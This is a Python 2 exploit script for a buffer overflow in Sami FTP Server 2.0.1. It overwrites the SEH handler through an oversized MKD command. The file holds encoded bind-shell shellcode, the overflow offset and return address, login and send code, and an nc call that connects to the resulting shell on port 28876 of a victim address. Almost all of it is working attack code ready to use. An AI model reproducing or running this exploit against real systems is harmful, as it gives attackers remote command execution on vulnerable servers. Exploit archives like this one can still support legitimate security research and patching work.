#!/usr/bin/python

# Exploit Title: Sami FTP MKD buffer overflow (SEH) + Bypass ASL
# Date: 11 Agosto 2013
# Exploit Author: Christian (Polunchis) Ramirez https://intrusionlabs.org
# Vendor Homepage: http://www.karjasoft.com/old.php
# Version: Sami FTP Server 2.0.1
# Tested on: Windows 7 Home Basic x86, Spanish
# Thanks:To my wife for putting up with my possessions
#       
# Description: 
# A buffer overflow is triggered when a long MKD command is sent to the server and the user views the Log tab.
 
import socket, sys, os, time

if len(sys.argv) != 3:
        print "[*] Uso: %s <Ip Victima> <Puerto> \n" % sys.argv[0]
        print "[*] Exploit created by Polunchis"
        print "[*] https://www.intrusionlabs.org"
        sys.exit(0)
target = sys.argv[1]
port = int(sys.argv[2])

#msfpayload windows/shell_bind_tcp LPORT=28876 R | msfencode -a x86 -b '\x00\xff\x0a\x0d\x20\x40' -t c
shellcode = (
"\xda\xcf\xb8\xba\xb3\x1e\xe7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x56\x31\x42\x18\x83\xc2\x04\x03\x42\xae\x51\xeb\x1b\x26\x1c"
"\x14\xe4\xb6\x7f\x9c\x01\x87\xad\xfa\x42\xb5\x61\x88\x07\x35"
"\x09\xdc\xb3\xce\x7f\xc9\xb4\x67\x35\x2f\xfa\x78\xfb\xef\x50"
"\xba\x9d\x93\xaa\xee\x7d\xad\x64\xe3\x7c\xea\x99\x0b\x2c\xa3"
"\xd6\xb9\xc1\xc0\xab\x01\xe3\x06\xa0\x39\x9b\x23\x77\xcd\x11"
"\x2d\xa8\x7d\x2d\x65\x50\xf6\x69\x56\x61\xdb\x69\xaa\x28\x50"
"\x59\x58\xab\xb0\x93\xa1\x9d\xfc\x78\x9c\x11\xf1\x81\xd8\x96"
"\xe9\xf7\x12\xe5\x94\x0f\xe1\x97\x42\x85\xf4\x30\x01\x3d\xdd"
"\xc1\xc6\xd8\x96\xce\xa3\xaf\xf1\xd2\x32\x63\x8a\xef\xbf\x82"
"\x5d\x66\xfb\xa0\x79\x22\x58\xc8\xd8\x8e\x0f\xf5\x3b\x76\xf0"
"\x53\x37\x95\xe5\xe2\x1a\xf2\xca\xd8\xa4\x02\x44\x6a\xd6\x30"
"\xcb\xc0\x70\x79\x84\xce\x87\x7e\xbf\xb7\x18\x81\x3f\xc8\x31"
"\x46\x6b\x98\x29\x6f\x13\x73\xaa\x90\xc6\xd4\xfa\x3e\xb8\x94"
"\xaa\xfe\x68\x7d\xa1\xf0\x57\x9d\xca\xda\xee\x99\x04\x3e\xa3"
"\x4d\x65\xc0\x33\x42\xe0\x26\xd9\x4a\xa5\xf1\x75\xa9\x92\xc9"
"\xe2\xd2\xf0\x65\xbb\x44\x4c\x60\x7b\x6a\x4d\xa6\x28\xc7\xe5"
"\x21\xba\x0b\x32\x53\xbd\x01\x12\x1a\x86\xc2\xe8\x72\x45\x72"
"\xec\x5e\x3d\x17\x7f\x05\xbd\x5e\x9c\x92\xea\x37\x52\xeb\x7e"
"\xaa\xcd\x45\x9c\x37\x8b\xae\x24\xec\x68\x30\xa5\x61\xd4\x16"
"\xb5\xbf\xd5\x12\xe1\x6f\x80\xcc\x5f\xd6\x7a\xbf\x09\x80\xd1"
"\x69\xdd\x55\x1a\xaa\x9b\x59\x77\x5c\x43\xeb\x2e\x19\x7c\xc4"
"\xa6\xad\x05\x38\x57\x51\xdc\xf8\x67\x18\x7c\xa8\xef\xc5\x15"
"\xe8\x6d\xf6\xc0\x2f\x88\x75\xe0\xcf\x6f\x65\x81\xca\x34\x21"
"\x7a\xa7\x25\xc4\x7c\x14\x45\xcd"
)

# SEH overwritten at offset 468
# pop\pop\ret ESP at C:\Program Files\PMSystem\Temp\tmp0.dll (Universal)
# pop/pop/ret 10022689

jmpshort = '\xeb\x06\x90\x90'
nexseh= '\x89\x26\x02\x10'
garbage= '\x41' * 468
fixstack= '\x81\xc4\x48\xf4\xff\xff'

buffer = garbage + jmpshort + nexseh + fixstack + shellcode 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d" % (target,port)
try:
	s.connect((target,port))
        s.recv(1024)
	s.send('USER polunchis\r\n') 
	s.recv(1024)
	s.send('PASS polunchis\r\n')
	s.recv(1024)
	s.send("MKD " + buffer + "\r\n")
        print "[+] Sending payload of size", len(buffer) 
	print s.recv(1024)
	s.close()
	print "[+] Exploit Sent Successfully"
	print "[+] Waiting for 5 sec before spawning shell to " + target + ":28876\r"
	print "\r"
	time.sleep(5)
	os.system ("nc -n " + target + " 28876")
	print "[-] Connection lost from " + target + ":28876 \r"
except:
	print "[-] Could not connect to " + target + ":21\r"
        sys.exit(0) 